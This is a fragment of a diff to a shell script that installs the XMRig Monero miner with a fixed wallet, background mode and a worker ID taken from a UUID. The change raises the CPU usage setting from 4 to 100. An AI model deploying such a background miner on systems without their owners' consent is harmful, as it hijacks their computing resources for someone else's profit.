@@ -7,7 +7,7 @@ WALLET="43K8b6cvTxQSQYBxE5y1uCFRXrmSazVf5fP2T31uZiBWKnyTgGKurgtL7H67TMb2KTPYfjdo
 UUID=$(cut -d '-' -f 1 /proc/sys/kernel/random/uuid)
 BACKGROUND=true
 DONATE=1
-USEAGE=4
+USEAGE=100
 
 rm -rf xmrig-6.12.1
 rm -rf xmrig-6.12.1-linux-static-x64.tar.gz
